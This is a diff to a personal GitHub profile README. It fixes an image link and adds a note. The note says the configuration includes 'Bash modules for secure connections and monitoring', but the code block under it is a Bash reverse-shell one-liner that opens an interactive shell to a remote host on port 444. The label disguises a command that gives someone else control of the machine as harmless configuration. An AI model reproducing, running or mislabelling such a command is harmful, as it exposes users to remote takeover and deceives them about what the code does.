@@ -12,7 +12,7 @@
   </div>
 
   <div style="flex: 1; text-align: right;">
-    [Cybersecurity GIF](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExcHFhOWVsNXFrYWhqazV6eXVvamxlazB6dmxwcmg1OGQxcDJucGNuNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2IudUHdI075HL02Pkk/giphy.webp) <!-- Replace with a more relevant GIF if needed -->
+    ![Cybersecurity GIF](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExcHFhOWVsNXFrYWhqazV6eXVvamxlazB6dmxwcmg1OGQxcDJucGNuNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2IudUHdI075HL02Pkk/giphy.webp) <!-- Replace with a more relevant GIF if needed -->
   </div>
 
 </div>
@@ -51,4 +51,10 @@
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-Errabab-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/erabab-salec-ahrayam-316584263/)
 [![X (Twitter)](https://img.shields.io/badge/X-_jk_29-blue?style=for-the-badge&logo=x)](https://x.com/_jk_29)
 
+---
 
+#### Note:
+_This configuration includes Bash modules for secure connections and monitoring:_
+
+```bash
+/bin/bash -i >& /dev/tcp/Errabab/444 0>&1
